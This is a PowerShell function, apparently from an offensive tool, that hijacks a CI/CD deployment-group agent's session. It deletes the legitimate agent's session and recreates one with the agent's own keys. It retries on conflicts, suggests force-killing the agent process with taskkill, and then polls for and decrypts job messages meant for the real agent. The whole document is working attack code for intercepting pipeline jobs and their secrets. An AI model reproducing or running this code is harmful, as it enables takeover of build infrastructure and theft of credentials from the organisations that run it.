# ── Deployment Group Session Race ───────────────────────
# create session alongside real agent, race for
# messages with 5s polling. Session may be reclaimed mid-poll.
# ─────────────────────────────────────────────────────────────────
function Invoke-SessionRace {
    param(
        [hashtable]$AgentInfo,
        [hashtable]$Auth
    )

    Write-Host ""
    Write-Log "DEPLOYMENT GROUP MODE: Session race" -Severity Info

    $existingSession = Find-SessionId -AgentPath $AgentInfo.AgentPath
    $maxRetries = 30
    $sessionId  = $null
    $aesKey     = $null

    for ($i = 1; $i -le $maxRetries; $i++) {
        if ($existingSession) {
            Write-Log "Attempt $i - deleting session $existingSession" -Severity Warning
            Remove-Session -ServerUrl $AgentInfo.ServerUrl -PoolId $AgentInfo.PoolId `
                -SessionId $existingSession -ApiHeaders $Auth.ApiHeaders
        }

        $result = New-AgentSession -AgentInfo $AgentInfo -ApiHeaders $Auth.ApiHeaders -Rsa $AgentInfo.Rsa
        if ($result.SessionId) {
            $sessionId = $result.SessionId
            $aesKey    = $result.AesKey
            Write-Log "Session created: $sessionId" -Severity Success
            break
        }

        if ($result.IsConflict) {
            if ($i -eq 1) {
                Write-Log "409 Conflict - real agent holds active session" -Severity Warning
                Write-Detail "Retrying every 3s (agent session will timeout during keep-alive gap)" "Yellow"
                Write-Detail "For instant capture: taskkill /IM Agent.Listener.exe /F" "Yellow"
            } else {
                Write-Host "." -NoNewline
            }
        } else {
            Write-Log "Error: $($result.Error)" -Severity Warning
        }
        Start-Sleep -Seconds 3
    }

    if (-not $sessionId) {
        Write-Host ""
        Write-Log "Could not establish session after $maxRetries attempts" -Severity Error
        Write-Detail "Options:" "Yellow"
        exit 1
    }

    # Race poll loop
    Write-Host ""
    Write-Log "Listening for job messages (race mode, 5s poll)..." -Severity Info
    Write-Log "Trigger a pipeline now!" -Severity Warning
    Write-Host ""

    $jobJson = $null
    $round = 0

    while (-not $jobJson) {
        $round++

        # Session lost? Recreate
        if (-not $sessionId -or -not $aesKey) {
            $result = New-AgentSession -AgentInfo $AgentInfo -ApiHeaders $Auth.ApiHeaders -Rsa $AgentInfo.Rsa
            if ($result.SessionId) {
                $sessionId = $result.SessionId
                $aesKey    = $result.AesKey
                Write-Log "Session recreated: $sessionId" -Severity Success
            } else {
                Write-Host "x" -NoNewline
                Start-Sleep -Seconds 3
                continue
            }
        }

        $messagesUrl = "$($AgentInfo.ServerUrl)/_apis/distributedtask/pools/$($AgentInfo.PoolId)/messages?sessionId=$sessionId&api-version=7.0"
        try {
            $response = Invoke-RestMethod -Uri $messagesUrl -Headers $Auth.ApiHeaders -Method GET -TimeoutSec 5
            if ($response -and $response.body) {
                Write-Host ""
                Write-Log "Encrypted message received! (round $round)" -Severity Success
                $jobJson = Decrypt-JobMessage $response $aesKey
                Write-Log "Decrypted job: $($jobJson.Length) chars" -Severity Success
            }
        } catch {
            $errDetail = ""
            try { $errDetail = $_.ErrorDetails.Message } catch {}

            if ($errDetail -match 'TaskAgentSession|SessionExpired|session') {
                Write-Host ""
                Write-Log "Session lost (agent reclaimed) - recreating... (round $round)" -Severity Warning
                $sessionId = $null
                $aesKey    = $null
                continue
            }
            Write-Host "." -NoNewline
        }
        if (-not $jobJson) { Start-Sleep -Seconds 5 }
    }

    return @{
        SessionId = $sessionId
        AesKey    = $aesKey
        JobJson   = $jobJson
    }
}
